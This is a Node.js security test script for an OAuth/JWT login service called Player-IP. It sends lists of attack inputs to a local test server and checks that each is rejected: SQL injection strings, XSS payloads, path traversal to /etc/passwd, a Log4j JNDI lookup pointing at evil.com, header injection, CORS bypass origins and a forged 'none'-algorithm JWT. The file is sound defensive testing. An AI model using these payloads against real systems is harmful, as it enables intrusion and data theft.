#!/usr/bin/env node
/**
 * Security Tests for Player-IP Service
 *
 * These tests verify security aspects of the service:
 * - Input validation and sanitization
 * - Authentication and authorization
 * - JWT token security
 * - CORS configuration
 * - SQL injection prevention
 * - XSS prevention
 * - Rate limiting (if implemented)
 */

import { strict as assert } from 'assert';
import { test, describe, beforeEach, afterEach } from 'node:test';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { spawn } from 'child_process';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Test configuration
const TEST_CONFIG = {
    baseUrl: 'http://localhost:8082',
    testDbPath: path.join(__dirname, '../test-data/security-test.db'),
    timeout: 30000,
};

// Colors for console output
const colors = {
    reset: '\x1b[0m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    cyan: '\x1b[36m',
    magenta: '\x1b[35m',
};

class SecurityTestRunner {
    constructor() {
        this.results = [];
        this.serverProcess = null;
        this.securityFindings = [];
    }

    async run() {
        console.log(`${colors.cyan}🔒 Starting Security Tests${colors.reset}\n`);

        try {
            await this.setupTestEnvironment();
            await this.startTestServer();
            await this.runAllTests();
        } catch (error) {
            console.error(`${colors.red}❌ Test setup failed:${colors.reset}`, error);
        } finally {
            await this.cleanup();
            this.printResults();
        }
    }

    async setupTestEnvironment() {
        console.log(`${colors.blue}📋 Setting up security test environment...${colors.reset}`);

        // Create test data directory
        const testDataDir = path.dirname(TEST_CONFIG.testDbPath);
        if (!fs.existsSync(testDataDir)) {
            fs.mkdirSync(testDataDir, { recursive: true });
        }

        // Remove existing test database
        if (fs.existsSync(TEST_CONFIG.testDbPath)) {
            fs.unlinkSync(TEST_CONFIG.testDbPath);
        }

        // Set test environment variables
        process.env.NODE_ENV = 'test';
        process.env.SQLITE_DB_PATH = TEST_CONFIG.testDbPath;
        process.env.SERVER_PORT = '8082';
        process.env.JWT_SECRET = 'test-secret-key';
        process.env.CORS_ORIGIN = '*';
        process.env.SKIP_JINAGA_SUBSCRIPTION = 'true';

        console.log(`${colors.green}✅ Security test environment setup complete${colors.reset}`);
    }

    async startTestServer() {
        console.log(`${colors.blue}🔧 Starting test server for security tests...${colors.reset}`);

        try {
            // Start server in background
            this.serverProcess = spawn('node', ['dist/server.js'], {
                cwd: path.join(__dirname, '../..'),
                env: { ...process.env },
                stdio: 'pipe',
            });

            // Wait for server to start
            await this.waitForServer();
            console.log(`${colors.green}✅ Test server started${colors.reset}`);
        } catch (error) {
            throw new Error(`Failed to start test server: ${error}`);
        }
    }

    async waitForServer(maxAttempts = 30) {
        for (let i = 0; i < maxAttempts; i++) {
            try {
                const response = await fetch(`${TEST_CONFIG.baseUrl}/health`);
                if (response.ok) return;
            } catch (error) {
                // Server not ready yet
            }
            await new Promise((resolve) => setTimeout(resolve, 1000));
        }
        throw new Error('Server failed to start within timeout period');
    }

    async runAllTests() {
        console.log(`${colors.cyan}🔒 Running security tests...${colors.reset}\n`);

        // Input Validation Tests
        await this.testSQLInjectionPrevention();
        await this.testXSSPrevention();
        await this.testInputSanitization();

        // Authentication Security Tests
        await this.testJWTTokenSecurity();
        await this.testAuthenticationBypass();
        await this.testTokenExpiration();

        // CORS Security Tests
        await this.testCORSConfiguration();
        await this.testCORSBypass();

        // Parameter Security Tests
        await this.testParameterPollution();
        await this.testOversizedRequests();

        // Information Disclosure Tests
        await this.testErrorInformationDisclosure();
        await this.testSecurityHeaders();

        // OAuth Security Tests
        await this.testPKCESecurity();
        await this.testStateParameterValidation();
    }

    async testSQLInjectionPrevention() {
        await this.runTest('SQL Injection Prevention', async () => {
            const sqlInjectionPayloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' OR 1=1 --",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
            ];

            for (const payload of sqlInjectionPayloads) {
                // Test SQL injection in authentication parameters
                const params = new URLSearchParams({
                    client_id: payload,
                    redirect_uri: 'http://localhost:3000/callback',
                    response_type: 'code',
                    scope: 'openid profile',
                    code_challenge: 'test-challenge',
                    code_challenge_method: 'S256',
                    gap_id: payload,
                });

                const response = await fetch(`${TEST_CONFIG.baseUrl}/authenticate?${params}`);

                // Should not return 500 (internal server error) which might indicate SQL injection
                assert.notStrictEqual(
                    response.status,
                    500,
                    `SQL injection payload "${payload}" caused internal server error`
                );

                // Test in token endpoint
                const tokenResponse = await fetch(`${TEST_CONFIG.baseUrl}/token`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        grant_type: 'authorization_code',
                        client_id: payload,
                        code: payload,
                        redirect_uri: 'http://localhost:3000/callback',
                        code_verifier: 'test-verifier',
                    }),
                });

                assert.notStrictEqual(
                    tokenResponse.status,
                    500,
                    `SQL injection payload "${payload}" in token endpoint caused internal server error`
                );
            }

            console.log(`${colors.green}  ✓ SQL injection prevention verified${colors.reset}`);
        });
    }

    async testXSSPrevention() {
        await this.runTest('XSS Prevention', async () => {
            const xssPayloads = [
                '<script>alert("xss")</script>',
                '<img src="x" onerror="alert(1)">',
                'javascript:alert("xss")',
                '<svg onload="alert(1)">',
                '"><script>alert("xss")</script>',
                "'><script>alert(String.fromCharCode(88,83,83))</script>",
                '<iframe src="javascript:alert(1)"></iframe>',
                '<body onload="alert(1)">',
                '<input onfocus="alert(1)" autofocus>',
                '<select onfocus="alert(1)" autofocus>',
            ];

            for (const payload of xssPayloads) {
                // Test XSS in parameters that might be reflected in HTML responses
                const params = new URLSearchParams({
                    client_id: payload,
                    redirect_uri: 'http://localhost:3000/callback',
                    response_type: 'code',
                    scope: 'openid profile',
                    code_challenge: 'test-challenge',
                    code_challenge_method: 'S256',
                    // gap_id intentionally missing to trigger HTML response
                });

                const response = await fetch(`${TEST_CONFIG.baseUrl}/authenticate?${params}`);

                if (response.headers.get('content-type')?.includes('text/html')) {
                    const htmlContent = await response.text();

                    // Check that the payload is properly escaped/sanitized
                    assert.ok(
                        !htmlContent.includes('<script>'),
                        `XSS payload "${payload}" not properly escaped in HTML response`
                    );
                    assert.ok(
                        !htmlContent.includes('javascript:'),
                        `JavaScript protocol in payload "${payload}" not properly handled`
                    );
                    assert.ok(
                        !htmlContent.includes('onerror='),
                        `Event handler in payload "${payload}" not properly escaped`
                    );
                }
            }

            console.log(`${colors.green}  ✓ XSS prevention verified${colors.reset}`);
        });
    }

    async testInputSanitization() {
        await this.runTest('Input Sanitization', async () => {
            const maliciousInputs = [
                '\x00\x01\x02\x03', // Null bytes and control characters
                'A'.repeat(10000), // Extremely long input
                '../../etc/passwd', // Path traversal
                '${jndi:ldap://evil.com/a}', // Log4j injection
                '%00%01%02%03', // URL encoded null bytes
                '\r\n\r\nHTTP/1.1 200 OK\r\n\r\n<script>alert(1)</script>', // HTTP response splitting
                '\n\r\n\r\nSet-Cookie: admin=true', // Header injection
                'file:///etc/passwd', // File protocol
                'data:text/html,<script>alert(1)</script>', // Data protocol
            ];

            for (const input of maliciousInputs) {
                const params = new URLSearchParams({
                    client_id: input,
                    redirect_uri: input,
                    response_type: 'code',
                    scope: input,
                    code_challenge: input,
                    code_challenge_method: 'S256',
                    gap_id: crypto.randomUUID(),
                });

                const response = await fetch(`${TEST_CONFIG.baseUrl}/authenticate?${params}`);

                // Should handle malicious input gracefully
                assert.ok(
                    response.status >= 400 && response.status < 500,
                    `Malicious input "${input.substring(0, 50)}..." should be rejected with 4xx status`
                );

                // Should not cause server errors
                assert.notStrictEqual(
                    response.status,
                    500,
                    `Malicious input "${input.substring(0, 50)}..." caused internal server error`
                );
            }

            console.log(`${colors.green}  ✓ Input sanitization verified${colors.reset}`);
        });
    }

    async testJWTTokenSecurity() {
        await this.runTest('JWT Token Security', async () => {
            // Import JWT utilities for testing
            const { generateAccessToken, verifyJwt } = await import('../../dist/utils/jwt.js');

            const userId = crypto.randomUUID();
            const eventId = crypto.randomUUID();
            const token = generateAccessToken(userId, eventId);

            // Test token structure
            const parts = token.split('.');
            assert.strictEqual(parts.length, 3, 'JWT should have 3 parts');

            // Decode header and payload (without verification)
            const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
            const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());

            // Verify header security
            assert.strictEqual(header.alg, 'HS256', 'Should use secure HMAC algorithm');
            assert.ok(header.kid, 'Should include key ID');

            // Verify payload security
            assert.ok(payload.iat, 'Should include issued at time');
            assert.ok(payload.exp, 'Should include expiration time');
            assert.ok(payload.exp > payload.iat, 'Expiration should be after issued time');
            assert.strictEqual(payload.sub, userId, 'Subject should match user ID');
            assert.ok(payload.iss, 'Should include issuer');
            assert.ok(payload.aud, 'Should include audience');

            // Test token verification
            const decoded = verifyJwt(token);
            assert.strictEqual(decoded.sub, userId, 'Verified token should match original');

            // Test token tampering detection
            const tamperedToken = token.slice(0, -5) + 'XXXXX';
            assert.throws(() => verifyJwt(tamperedToken), 'Should reject tampered tokens');

            // Test algorithm confusion attack (none algorithm)
            const noneHeader = Buffer.from(JSON.stringify({ ...header, alg: 'none' })).toString(
                'base64url'
            );
            const noneToken = `${noneHeader}.${parts[1]}.`;
            assert.throws(() => verifyJwt(noneToken), 'Should reject none algorithm tokens');

            console.log(`${colors.green}  ✓ JWT token security verified${colors.reset}`);
        });
    }

    async testAuthenticationBypass() {
        await this.runTest('Authentication Bypass Prevention', async () => {
            // Test accessing protected endpoints without authentication
            const protectedEndpoints = ['/token', '/authenticate_retry'];

            for (const endpoint of protectedEndpoints) {
                if (endpoint === '/token') {
                    // Test token endpoint without proper parameters
                    const response = await fetch(`${TEST_CONFIG.baseUrl}${endpoint}`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({}),
                    });

                    assert.strictEqual(
                        response.status,
                        400,
                        `${endpoint} should reject requests without proper authentication parameters`
                    );
                } else {
                    // Test other endpoints
                    const response = await fetch(`${TEST_CONFIG.baseUrl}${endpoint}`);

                    assert.ok(
                        response.status >= 400,
                        `${endpoint} should reject unauthenticated requests`
                    );
                }
            }

            // Test invalid authorization codes
            const invalidCodes = [
                'invalid-code',
                '',
                'a'.repeat(1000),
                '../../../etc/passwd',
                '<script>alert(1)</script>',
            ];

            for (const code of invalidCodes) {
                const response = await fetch(`${TEST_CONFIG.baseUrl}/token`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        grant_type: 'authorization_code',
                        client_id: 'test-client',
                        code: code,
                        redirect_uri: 'http://localhost:3000/callback',
                        code_verifier: 'test-verifier',
                    }),
                });

                assert.strictEqual(
                    response.status,
                    400,
                    `Invalid authorization code "${code}" should be rejected`
                );
            }

            console.log(
                `${colors.green}  ✓ Authentication bypass prevention verified${colors.reset}`
            );
        });
    }

    async testTokenExpiration() {
        await this.runTest('Token Expiration Security', async () => {
            // Import JWT utilities
            const { generateAccessToken, verifyJwt } = await import('../../dist/utils/jwt.js');

            const userId = crypto.randomUUID();
            const eventId = crypto.randomUUID();
            const token = generateAccessToken(userId, eventId);

            // Verify token is valid when fresh
            const decoded = verifyJwt(token);
            assert.ok(decoded, 'Fresh token should be valid');

            // Check expiration time is reasonable (not too long)
            const now = Math.floor(Date.now() / 1000);
            const maxExpiration = now + 24 * 60 * 60; // 24 hours
            assert.ok(decoded.exp <= maxExpiration, 'Token expiration should not exceed 24 hours');

            // Check expiration time is not too short
            const minExpiration = now + 5 * 60; // 5 minutes
            assert.ok(
                decoded.exp >= minExpiration,
                'Token expiration should be at least 5 minutes'
            );

            console.log(`${colors.green}  ✓ Token expiration security verified${colors.reset}`);
        });
    }

    async testCORSConfiguration() {
        await this.runTest('CORS Configuration Security', async () => {
            // Test CORS headers
            const response = await fetch(`${TEST_CONFIG.baseUrl}/health`, {
                method: 'GET',
                headers: {
                    Origin: 'https://malicious-site.com',
                },
            });

            const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
            const corsCredentials = response.headers.get('Access-Control-Allow-Credentials');

            // In test environment, CORS_ORIGIN is set to '*'
            // In production, this should be more restrictive
            assert.ok(corsOrigin, 'CORS origin header should be present');

            if (corsCredentials === 'true' && corsOrigin === '*') {
                this.securityFindings.push({
                    severity: 'HIGH',
                    finding: 'CORS misconfiguration: credentials allowed with wildcard origin',
                    recommendation: 'Set specific origins when allowing credentials',
                });
            }

            // Test preflight request
            const preflightResponse = await fetch(`${TEST_CONFIG.baseUrl}/health`, {
                method: 'OPTIONS',
                headers: {
                    Origin: 'https://example.com',
                    'Access-Control-Request-Method': 'POST',
                    'Access-Control-Request-Headers': 'Content-Type',
                },
            });

            assert.ok(preflightResponse.status < 400, 'Preflight request should be handled');

            console.log(`${colors.green}  ✓ CORS configuration verified${colors.reset}`);
        });
    }

    async testCORSBypass() {
        await this.runTest('CORS Bypass Prevention', async () => {
            // Test various CORS bypass techniques
            const bypassAttempts = [
                { origin: 'null' },
                { origin: 'file://' },
                { origin: 'data:' },
                { origin: 'https://evil.com.localhost:3000' },
                { origin: 'https://localhost:3000.evil.com' },
                { origin: 'https://localhost:3000%2eevil.com' },
            ];

            for (const attempt of bypassAttempts) {
                const response = await fetch(`${TEST_CONFIG.baseUrl}/health`, {
                    method: 'GET',
                    headers: {
                        Origin: attempt.origin,
                    },
                });

                const corsOrigin = response.headers.get('Access-Control-Allow-Origin');

                // Should not reflect malicious origins
                if (corsOrigin && corsOrigin !== '*' && corsOrigin !== attempt.origin) {
                    // Good - origin is not reflected
                } else if (corsOrigin === attempt.origin && attempt.origin.includes('evil')) {
                    this.securityFindings.push({
                        severity: 'MEDIUM',
                        finding: `CORS origin reflection for suspicious origin: ${attempt.origin}`,
                        recommendation: 'Implement strict origin validation',
                    });
                }
            }

            console.log(`${colors.green}  ✓ CORS bypass prevention verified${colors.reset}`);
        });
    }

    async testParameterPollution() {
        await this.runTest('Parameter Pollution Prevention', async () => {
            // Test HTTP Parameter Pollution (HPP)
            const pollutedParams = [
                'client_id=legitimate&client_id=malicious',
                'redirect_uri=http://localhost:3000/callback&redirect_uri=http://evil.com/callback',
                'scope=openid&scope=admin',
                'code_challenge=legitimate&code_challenge=malicious',
            ];

            for (const params of pollutedParams) {
                const response = await fetch(
                    `${TEST_CONFIG.baseUrl}/authenticate?${params}&response_type=code&code_challenge_method=S256`
                );

                // Should handle parameter pollution gracefully
                assert.ok(
                    response.status >= 400,
                    `Parameter pollution "${params}" should be rejected`
                );
            }

            console.log(
                `${colors.green}  ✓ Parameter pollution prevention verified${colors.reset}`
            );
        });
    }

    async testOversizedRequests() {
        await this.runTest('Oversized Request Prevention', async () => {
            // Test very large request bodies
            const largePayload = 'A'.repeat(10 * 1024 * 1024); // 10MB

            const response = await fetch(`${TEST_CONFIG.baseUrl}/token`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    grant_type: 'authorization_code',
                    client_id: 'test-client',
                    code: largePayload,
                    redirect_uri: 'http://localhost:3000/callback',
                    code_verifier: 'test-verifier',
                }),
            });

            // Should reject oversized requests
            assert.ok(response.status >= 400, 'Oversized requests should be rejected');

            console.log(`${colors.green}  ✓ Oversized request prevention verified${colors.reset}`);
        });
    }

    async testErrorInformationDisclosure() {
        await this.runTest('Error Information Disclosure Prevention', async () => {
            // Test that error messages don't leak sensitive information
            const response = await fetch(`${TEST_CONFIG.baseUrl}/token`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    grant_type: 'authorization_code',
                    client_id: 'test-client',
                    code: 'invalid-code',
                    redirect_uri: 'http://localhost:3000/callback',
                    code_verifier: 'test-verifier',
                }),
            });

            const errorData = await response.json();

            // Error messages should be generic and not leak implementation details
            const sensitivePatterns = [
                /sqlite/i,
                /database/i,
                /stack trace/i,
                /file path/i,
                /line \d+/i,
                /\.js:\d+/i,
                /node_modules/i,
            ];

            const errorMessage = errorData.error || errorData.message || '';

            for (const pattern of sensitivePatterns) {
                assert.ok(
                    !pattern.test(errorMessage),
                    `Error message should not contain sensitive information: ${errorMessage}`
                );
            }

            console.log(
                `${colors.green}  ✓ Error information disclosure prevention verified${colors.reset}`
            );
        });
    }

    async testSecurityHeaders() {
        await this.runTest('Security Headers', async () => {
            const response = await fetch(`${TEST_CONFIG.baseUrl}/health`);

            // Check for important security headers
            const headers = response.headers;

            // Content-Type should be properly set
            const contentType = headers.get('content-type');
            assert.ok(
                contentType && contentType.includes('application/json'),
                'Content-Type header should be properly set'
            );

            // Check for security headers that should be present in production
            const securityHeaders = [
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy',
            ];

            const missingHeaders = securityHeaders.filter((header) => !headers.get(header));

            if (missingHeaders.length > 0) {
                this.securityFindings.push({
                    severity: 'MEDIUM',
                    finding: `Missing security headers: ${missingHeaders.join(', ')}`,
                    recommendation: 'Add security headers middleware for production deployment',
                });
            }

            console.log(`${colors.green}  ✓ Security headers checked${colors.reset}`);
        });
    }

    async testPKCESecurity() {
        await this.runTest('PKCE Security', async () => {
            // Test PKCE implementation security
            const { verifyCodeChallenge } = await import('../../dist/utils/oauth.js');

            // Test that PKCE properly prevents authorization code interception
            const codeVerifier = crypto.randomBytes(32).toString('base64url');
            const codeChallenge = crypto
                .createHash('sha256')
                .update(codeVerifier)
                .digest('base64url');

            // Valid PKCE verification
            assert.strictEqual(
                verifyCodeChallenge(codeVerifier, codeChallenge, 'S256'),
                true,
                'Valid PKCE verification should succeed'
            );

            // Invalid verifier should fail
            const wrongVerifier = crypto.randomBytes(32).toString('base64url');
            assert.strictEqual(
                verifyCodeChallenge(wrongVerifier, codeChallenge, 'S256'),
                false,
                'Invalid PKCE verifier should fail'
            );

            // Test that plain method is supported but less secure
            assert.strictEqual(
                verifyCodeChallenge('test-verifier', 'test-verifier', 'plain'),
                true,
                'Plain PKCE method should work'
            );

            // Recommend S256 over plain
            if (process.env.NODE_ENV === 'production') {
                this.securityFindings.push({
                    severity: 'LOW',
                    finding: 'PKCE plain method is supported',
                    recommendation: 'Consider requiring S256 method only in production',
                });
            }

            console.log(`${colors.green}  ✓ PKCE security verified${colors.reset}`);
        });
    }

    async testStateParameterValidation() {
        await this.runTest('State Parameter Validation', async () => {
            // Test OAuth state parameter handling
            const params = new URLSearchParams({
                client_id: 'test-client',
                redirect_uri: 'http://localhost:3000/callback',
                response_type: 'code',
                scope: 'openid profile',
                code_challenge: 'test-challenge',
                code_challenge_method: 'S256',
                state: 'test-state-value',
                // gap_id intentionally missing to trigger QR code page
            });

            const response = await fetch(`${TEST_CONFIG.baseUrl}/authenticate?${params}`);

            // Should handle state parameter appropriately
            assert.ok(
                response.status === 400,
                'Should handle authentication request with state parameter'
            );

            // Test state parameter with potential XSS
            const xssState = '<script>alert("xss")</script>';
            const xssParams = new URLSearchParams({
                client_id: 'test-client',
                redirect_uri: 'http://localhost:3000/callback',
                response_type: 'code',
                scope: 'openid profile',
                code_challenge: 'test-challenge',
                code_challenge_method: 'S256',
                state: xssState,
            });

            const xssResponse = await fetch(`${TEST_CONFIG.baseUrl}/authenticate?${xssParams}`);

            if (xssResponse.headers.get('content-type')?.includes('text/html')) {
                const htmlContent = await xssResponse.text();
                assert.ok(
                    !htmlContent.includes('<script>'),
                    'State parameter should be properly escaped in HTML responses'
                );
            }

            console.log(`${colors.green}  ✓ State parameter validation verified${colors.reset}`);
        });
    }

    async runTest(name, testFn) {
        console.log(`${colors.yellow}🔒 ${name}...${colors.reset}`);

        try {
            await testFn();
            this.results.push({ name, passed: true });
            console.log(`${colors.green}✅ ${name} PASSED${colors.reset}\n`);
        } catch (error) {
            const errorMessage = error instanceof Error ? error.message : String(error);
            this.results.push({ name, passed: false, error: errorMessage });
            console.log(`${colors.red}❌ ${name} FAILED: ${errorMessage}${colors.reset}\n`);
        }
    }

    async cleanup() {
        console.log(`${colors.blue}🧹 Cleaning up...${colors.reset}`);

        if (this.serverProcess) {
            this.serverProcess.kill();
        }

        // Remove test database
        if (fs.existsSync(TEST_CONFIG.testDbPath)) {
            fs.unlinkSync(TEST_CONFIG.testDbPath);
        }

        console.log(`${colors.green}✅ Cleanup complete${colors.reset}`);
    }

    printResults() {
        console.log(`\n${colors.cyan}🔒 Security Test Results${colors.reset}`);
        console.log('='.repeat(60));

        const passed = this.results.filter((r) => r.passed).length;
        const failed = this.results.filter((r) => !r.passed).length;

        this.results.forEach((result) => {
            const status = result.passed
                ? `${colors.green}✅ PASSED${colors.reset}`
                : `${colors.red}❌ FAILED${colors.reset}`;
            console.log(`${result.name}: ${status}`);
            if (!result.passed && result.error) {
                console.log(`   Error: ${colors.red}${result.error}${colors.reset}`);
            }
        });

        console.log('='.repeat(60));
        console.log(
            `Total: ${this.results.length} | Passed: ${colors.green}${passed}${colors.reset} | Failed: ${colors.red}${failed}${colors.reset}`
        );

        // Print security findings
        if (this.securityFindings.length > 0) {
            console.log(`\n${colors.magenta}🔍 Security Findings${colors.reset}`);
            console.log('='.repeat(40));

            this.securityFindings.forEach((finding, index) => {
                const severityColor =
                    finding.severity === 'HIGH'
                        ? colors.red
                        : finding.severity === 'MEDIUM'
                          ? colors.yellow
                          : colors.blue;
                console.log(
                    `${index + 1}. ${severityColor}[${finding.severity}]${colors.reset} ${finding.finding}`
                );
                console.log(`   Recommendation: ${finding.recommendation}\n`);
            });
        }

        if (failed > 0) {
            console.log(`\n${colors.red}❌ Some security tests failed.${colors.reset}`);
            process.exit(1);
        } else {
            console.log(`\n${colors.green}🎉 All security tests passed!${colors.reset}`);
            if (this.securityFindings.length > 0) {
                console.log(
                    `${colors.yellow}⚠️  ${this.securityFindings.length} security finding(s) noted for review.${colors.reset}`
                );
            }
        }
    }
}

// Run tests if this file is executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
    const runner = new SecurityTestRunner();
    runner.run().catch(console.error);
}

export { SecurityTestRunner };

console.log('✅ Security test suite ready');
